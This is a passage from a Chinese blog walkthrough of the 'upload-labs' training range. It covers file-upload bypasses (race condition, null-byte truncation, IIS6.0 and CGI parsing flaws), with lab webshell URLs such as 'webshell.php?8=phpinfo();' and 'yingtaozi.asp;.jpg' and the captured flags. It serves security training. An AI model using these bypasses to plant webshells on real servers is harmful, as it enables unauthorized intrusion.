+<img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/ef62ab261057dd228ddb711434dbc0be_63669.png></p><p><strong>run</strong></p><p>开启以上两个 intruder， 等待结果。</p><p>略</p><h2 id=18-条件竞争2>18. 条件竞争2</h2><p>上传任意图片，提示 上传目录不可写</p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/0c1857c1e19aea6773bd396f71d4ab13_79554.png></p><p>分析源码， 确认上传流程是先到 临时目录， 在 move 到正式目录。</p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/73de663ec465a2695b198c90a05e2e82_33962.png></p><p>报错提示为，检查目标文件是否可写的时候触发的。</p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/b42f8d1c612069c0bc315b9c76a41331_93518.png></p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/69b9dbb66946e4e155cc7a1e01d55e92_74196.png></p><p>报错触发此时， 文件已经上传到临时目录。 因此可以使用条件竞争方式，创建子马。</p><p>那么， 临时目录又是什么呢？</p><p><code>cls_upload_dir</code> 值为空，
+<img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/2cea6d81fcaa28e8f24aedd5dc1d63ca_90936.png></p><p><code>MyUpload function</code> 也没有传入目录。但传入临时文件名。
+<img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/5f2f31cc10a1fa697d335d6f44bc7540_46061.png></p><ul><li><a href=https://www.php.net/manual/zh/reserved.variables.files.php target=_blank rel=noopener><code>_FILE</code></a>
+产生了一个随机文件名 ？？？ 那还玩儿什么？？</li></ul><p><strong>续</strong></p><p>当环境不存在写入问题时， 图片马会通过其他验证， 一直到 move() ，将 <strong>临时文件名</strong> 改为上传文件</p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/0b4cf0469c7560cda46dbb2101889396_95272.png></p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/f3efe0d4940287e67c669e1d665e23d6_34729.png></p><p>从而满足 <strong>条件竞争</strong> 的条件</p><h2 id=19-move_uploaded_file-截断>19 <code>move_uploaded_file()</code> 截断</h2><p>可以自定义文件名，使用 00 截断</p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/63c86a9121f03e080fffbb7089837b81_88618.png></p><p>使用 hex 将 <code>a</code> 改为 <code>00</code></p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/9dbc25edb4756e8a4aa013e89ff00252_97449.png></p><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://59.63.200.79:8016/Pass-19/upload//webshell.php?8<span style=color:#000;font-weight:700>=</span>phpinfo<span style=color:#000;font-weight:700>()</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic>## flag_CaLiXixv.txt : zkaq{FBKf-ufR@-i3FjiM}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=20---iis60解析漏洞一>20 . IIS6.0解析漏洞（一）</h2><ul><li><a href=https://blog.csdn.net/weixin_45650712/article/details/107920475 target=_blank rel=noopener>上传漏洞 之 iis解析漏洞、asp解析漏洞、文件解析漏洞、畸形解析漏洞、Apache解析漏洞</a></li><li><a href=https://www.cnblogs.com/xiaozi/p/7560907.html target=_blank rel=noopener>asp 一句话</a></li></ul><p>查看代码， <strong>后缀白名单</strong> 与 <strong>content-type 白名单</strong></p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/2285c39ff2f3e0d6e6c56fe11b44ad95_30565.png></p><p>抓包 对应修改</p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/4e97abff962c24341468f5caa397df78_55091.png></p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/ec2160eff322640d6a184ed7eefe212b_35360.png></p><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://59.63.200.79:8002/a/image/webshell.asa
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic># zKaQ-HatBI01Th</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=21-iis60-解析漏洞二>21. IIS6.0 解析漏洞（二）</h2><p>使用 asp 分号断言绕过 <code>;</code> : <code>webshell.asp;.jpg</code></p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/844dc58b449211aa57ec8386478e34ea_90489.png></p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/3bcbeb094a2b69eb8c295f1a9d9b0466_45495.png></p><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://59.63.200.79:8002/b/image/yingtaozi.asp;.jpg
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic># zKaQ-Y34Y2ets</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=21-iis60-解析漏洞三>21. IIS6.0 解析漏洞（三）</h2><p>利用 路径 包含 <code>x.asp</code> 的漏洞</p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/a26ea8bfb795f3e8e55e96b6ebbb5285_35864.png></p><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://59.63.200.79:8002/c/image/a.asp/1608724067.jpg
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic># zKaQ-Y1EHhm0O</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=22-cgi-漏洞>22. CGI 漏洞</h2><p>上传一个图片马， 使用 CGI 漏洞</p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/b41b15dc3e277aef4d2128d85a9d2237_14050.png></p><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://59.63.200.79:8016//Pass-23/upload/ggshell.gif/.php
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic># zKaQ-1Q2IO0SA</span>
+</span></span></code></pre></td></tr></table></div></div></div><div class=post-archive><ul class=post-copyright><img src=/mp/qrcode.png><br><li><strong>原文链接：</strong><a href=https://tangx.in/posts/2020/12/23/upload-labs/>https://tangx.in/posts/2020/12/23/upload-labs/</a></li><li>本文为原创文章，转载注明出处。</li><li>欢迎 <strong>扫码关注公众号</strong>
+<span style=background-color:#e8e8e9><code>maitalking</code></span>
+或 <strong>订阅网站</strong>
+<span style=background-color:#e8e8e9><a href=https://tangx.in/>https://tangx.in/</a></span>
+。</li><li>第一时间看后续精彩文章。觉得好的话，请猛击文章右下角「在看」，感谢支持。</li><li style=word-break:break-all></li></ul><br></div><div class=post-archive><h2>相关文章</h2><ul class=listing><li><a href=/posts/2020/12/17/sql-inject-by-pianyi/>SQL注入-偏移注入</a></li><li><a href=/posts/2020/12/15/sql-inject-by-wildchar/>SQL注入之 宽字节注入</a></li><li><a href=/posts/2020/12/14/sql-inject-with-head-x-forwarded-for/>Head 注入 - X-Forwarded-For 注入 （XFF）</a></li><li><a href=/posts/2020/12/12/sql-inject-by-head-and-quote-bypass/>SQL注入之 head 注入与引号绕过</a></li><li><a href=/posts/2020/12/10/zkaq-sql-inject-by-dnslog/>掌控安全 SQL 注入靶场练习 - Dnslog 带外测试</a></li></ul></div><div class="post-meta meta-tags"><ul class=clearfix><li><a href=/tags/%E5%AE%89%E5%85%A8 target=_blank>安全</a></li></ul></div></article><div class="post bg-white"><script src=https://utteranc.es/client.js repo=tangx/tangx.github.io issue-term=pathname theme=github-light crossorigin=anonymous async></script></div></div><footer id=footer><div>&copy; 2023 <a href=https://tangx.in/>老麦的书房 By 老麦</a>
+| <a rel=nofollow target=_blank href=http://beian.miit.gov.cn/>蜀ICP备16002016号-2</a></div><br><div><div class=github-badge><a href=https://gohugo.io/ target=_black rel=nofollow><span class=badge-subject>Powered by</span><span class="badge-value bg-blue">Hugo</span></a></div><div class=github-badge><a href=https://tangx.in/ target=_black><span class=badge-subject>Design by</span><span class="badge-value bg-brightgreen">老麦</span></a></div><div class=github-badge><a href=https://github.com/tangx/maupassant-hugo target=_black><span class=badge-subject>Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a></div></div></footer><script type=text/javascript>window.MathJax={tex2jax:{inlineMath:[["$","$"]],processEscapes:!0}}</script><script src='//cdn.bootcdn.net/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+<a id=rocket href=#top></a>
+<script type=text/javascript src='/js/totop.js?v=0.0.0' async></script><style type=text/css>div.highlight{position:relative;margin:1em 0}.copy-code{display:none;position:absolute;top:4px;right:4px;color:rgba(255,255,255,.8);background:rgba(78,78,78,.8);border-radius:var(--radius);padding:0 5px;font:inherit;user-select:none;cursor:pointer;border:0;--radius:8px}div.highlight:hover .copy-code,pre:hover .copy-code{display:block}</style><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script><script type=text/javascript src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js async></script></div><div id=secondary><section class=widget><form id=search action=https://tangx.in/search method=get accept-charset=utf-8 target=_blank _lpchecked=1><input type=text name=q maxlength=20 placeholder=Search>
+<input type=hidden name=sitesearch value=https://tangx.in/>
+<button type=submit class="submit icon-search"></button></form></section><section class=widget><h3 class=widget-title>最近文章</h3><ul class=widget-list><li><a href=https://tangx.in/posts/2022/12/30/vscode-shfmt/ title="Linux 工具命令(02): shfmt 格式化 shell 脚本" target=_blank>Linux 工具命令(02): shfmt 格式化 shell 脚本</a></li><li><a href=https://tangx.in/posts/2022/12/29/dos2unix-and-unix2dos/ title="Linux 基础命令(01): dos2unix 搞定 Linux 和 Windows 换行符的噩梦" target=_blank>Linux 基础命令(01): dos2unix 搞定 Linux 和 Windows 换行符的噩梦</a></li><li><a href=https://tangx.in/posts/2022/12/28/kustz-1-1-introduce/ title="从零开始写 k8s 发布工具（1） - kustz 介绍和设计思想" target=_blank>从零开始写 k8s 发布工具（1） - kustz 介绍和设计思想</a></li><li><a href=https://tangx.in/posts/2022/12/27/hugo-image-compress/ title="Hugo 网站优化(5)： 穷的还剩 8 分钱， 还能从 CDN 里面优化成本?" target=_blank>Hugo 网站优化(5)： 穷的还剩 8 分钱， 还能从 CDN 里面优化成本?</a></li><li><a href=https://tangx.in/posts/2022/12/27/hugo-cdn-http-referer/ title="Hugo 网站优化(4)： 为了防盗链， 不得不部署了两个网站" target=_blank>Hugo 网站优化(4)： 为了防盗链， 不得不部署了两个网站</a></li><li><a href=https://tangx.in/posts/2022/12/27/hugo-dns-shunting/ title="Hugo 网站优化(3)： 我用 DnsPod 给网站实现了全球加速" target=_blank>Hugo 网站优化(3)： 我用 DnsPod 给网站实现了全球加速</a></li><li><a href=https://tangx.in/posts/2022/12/26/hugo-cdn/ title="Hugo 网站优化(2)： 使用腾讯云 CDN 加速网站" target=_blank>Hugo 网站优化(2)： 使用腾讯云 CDN 加速网站</a></li><li><a href=https://tangx.in/posts/2022/12/26/hugo-render-markdown-image-url/ title="Hugo 网站优化(1)： 渲染 Markdown 图片引用地址" target=_blank>Hugo 网站优化(1)： 渲染 Markdown 图片引用地址</a></li><li><a href=https://tangx.in/posts/2022/12/23/aliyun-sls-trace-configuration/ title="Golang 配置并接入 Aliyun SLS Trace 服务" target=_blank>Golang 配置并接入 Aliyun SLS Trace 服务</a></li><li><a href=https://tangx.in/posts/2022/12/21/docker-container-set-timezone/ title="在 Docker 容器中设置时区原来这么简单" target=_blank>在 Docker 容器中设置时区原来这么简单</a></li></ul></section><section class=widget><h3 class=widget-title style=color:red>福利派送</h3><ul class=widget-list><li><a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" title="又拍云 CDN" target=_blank style=color:red><img src=/tuiguang/upyun.png></a></li><li><a href=https://url.cn/oThpo8gB title=【腾讯云】年终特惠，2核2G轻量应用服务器6.58元/月起 target=_blank style=color:red><img src=https://dscache.tencent-cloud.cn/upload//480x300-31cfe77af6a435bcde1680df1eb36fe936649b18.png></a></li><li><a href=https://www.aliyun.com/daily-act/ecs/activity_selection?userCode:bs5uqsfi title=【阿里云】服务器0元试用，首购低至0.9元/月起 target=_blank style=color:red><img src=/tuiguang/aliyun.png></a></li></ul></section><section class=widget><h3 class=widget-title><a href=/categories/>分类</a></h3><ul class=widget-list><li><a href=https://tangx.in/categories/aliyun/>aliyun (1)</a></li><li><a href=https://tangx.in/categories/blog/>blog (5)</a></li><li><a href=https://tangx.in/categories/books/>books (1)</a></li><li><a href=https://tangx.in/categories/docker/>docker (1)</a></li><li><a href=https://tangx.in/categories/gitlab/>gitlab (1)</a></li><li><a href=https://tangx.in/categories/golang/>golang (1)</a></li><li><a href=https://tangx.in/categories/linux/>linux (2)</a></li><li><a href=https://tangx.in/categories/redis/>redis (2)</a></li><li><a href=https://tangx.in/categories/vue3/>vue3 (2)</a></li></ul></section><section class=widget><h3 class=widget-title><a href=/tags/>标签</a></h3><div class=tagcloud><a href=https://tangx.in/tags/MSSQL/>MSSQL</a>
+<a href=https://tangx.in/tags/SQL%E6%B3%A8%E5%85%A5/>SQL注入</a>
+<a href=https://tangx.in/tags/XSS/>XSS</a>
+<a href=https://tangx.in/tags/XXE/>XXE</a>
+<a href=https://tangx.in/tags/aliyun/>aliyun</a>
+<a href=https://tangx.in/tags/ansible/>ansible</a>
+<a href=https://tangx.in/tags/apt/>apt</a>
+<a href=https://tangx.in/tags/aws/>aws</a>
+<a href=https://tangx.in/tags/axios/>axios</a>
+<a href=https://tangx.in/tags/blog/>blog</a>
+<a href=https://tangx.in/tags/calico/>calico</a>
+<a href=https://tangx.in/tags/cdn/>cdn</a>
+<a href=https://tangx.in/tags/cephfs/>cephfs</a>
+<a href=https://tangx.in/tags/cfssl/>cfssl</a>
+<a href=https://tangx.in/tags/cicd/>cicd</a>
+<a href=https://tangx.in/tags/cli-tools/>cli-tools</a>
+<a href=https://tangx.in/tags/cloudnative/>cloudnative</a>
+<a href=https://tangx.in/tags/code/>code</a>
+<a href=https://tangx.in/tags/config/>config</a>
+<a href=https://tangx.in/tags/configmap/>configmap</a>
+<a href=https://tangx.in/tags/container/>container</a>
+<a href=https://tangx.in/tags/database/>database</a>
+<a href=https://tangx.in/tags/defer/>defer</a>
+<a href=https://tangx.in/tags/dns/>dns</a>
+<a href=https://tangx.in/tags/dnsx/>dnsx</a>
+<a href=https://tangx.in/tags/docker/>docker</a>
+<a href=https://tangx.in/tags/docker-compose/>docker-compose</a>
+<a href=https://tangx.in/tags/dockerfile/>dockerfile</a>
+<a href=https://tangx.in/tags/download/>download</a>
+<a href=https://tangx.in/tags/filebeat/>filebeat</a>
+<a href=https://tangx.in/tags/gin/>gin</a>
+<a href=https://tangx.in/tags/gitlab/>gitlab</a>
+<a href=https://tangx.in/tags/glusterfs/>glusterfs</a>
+<a href=https://tangx.in/tags/golang/>golang</a>
+<a href=https://tangx.in/tags/gorm/>gorm</a>
+<a href=https://tangx.in/tags/haproxy/>haproxy</a>
+<a href=https://tangx.in/tags/html5/>html5</a>
+<a href=https://tangx.in/tags/https/>https</a>
+<a href=https://tangx.in/tags/hugo/>hugo</a>
+<a href=https://tangx.in/tags/iptables/>iptables</a>
+<a href=https://tangx.in/tags/js/>js</a>
+<a href=https://tangx.in/tags/k3s/>k3s</a>
+<a href=https://tangx.in/tags/k8s/>k8s</a>
+<a href=https://tangx.in/tags/kubernetes/>kubernetes</a>
+<a href=https://tangx.in/tags/kustz/>kustz</a>
+<a href=https://tangx.in/tags/lego/>lego</a>
+<a href=https://tangx.in/tags/libaray/>libaray</a>
+<a href=https://tangx.in/tags/linux/>linux</a>
+<a href=https://tangx.in/tags/log/>log</a>
+<a href=https://tangx.in/tags/minio/>minio</a>
+<a href=https://tangx.in/tags/mysql/>mysql</a>
+<a href=https://tangx.in/tags/network/>network</a>
+<a href=https://tangx.in/tags/nginx/>nginx</a>
+<a href=https://tangx.in/tags/proxy/>proxy</a>
+<a href=https://tangx.in/tags/python/>python</a>
+<a href=https://tangx.in/tags/qiniu/>qiniu</a>
+<a href=https://tangx.in/tags/redis/>redis</a>
+<a href=https://tangx.in/tags/reflect/>reflect</a>
+<a href=https://tangx.in/tags/repo/>repo</a>
+<a href=https://tangx.in/tags/s3/>s3</a>
+<a href=https://tangx.in/tags/scope/>scope</a>
+<a href=https://tangx.in/tags/shell/>shell</a>
+<a href=https://tangx.in/tags/slice/>slice</a>
+<a href=https://tangx.in/tags/sqlmap/>sqlmap</a>
+<a href=https://tangx.in/tags/storage/>storage</a>
+<a href=https://tangx.in/tags/test/>test</a>
+<a href=https://tangx.in/tags/tidb/>tidb</a>
+<a href=https://tangx.in/tags/tls/>tls</a>
+<a href=https://tangx.in/tags/tools/>tools</a>
+<a href=https://tangx.in/tags/trace/>trace</a>
+<a href=https://tangx.in/tags/typescript/>typescript</a>
+<a href=https://tangx.in/tags/typora/>typora</a>
+<a href=https://tangx.in/tags/v2ray/>v2ray</a>
+<a href=https://tangx.in/tags/vscode/>vscode</a>
+<a href=https://tangx.in/tags/vue/>vue</a>
+<a href=https://tangx.in/tags/vue3/>vue3</a>
+<a href=https://tangx.in/tags/%E5%AE%89%E5%85%A8/>安全</a></div></section><section class=widget><h3 class=widget-title>其它</h3><ul class=widget-list><li><a href=https://tangx.in/%20index.xml>文章 RSS</a></li></ul></section></div></div></div></div></body></html>
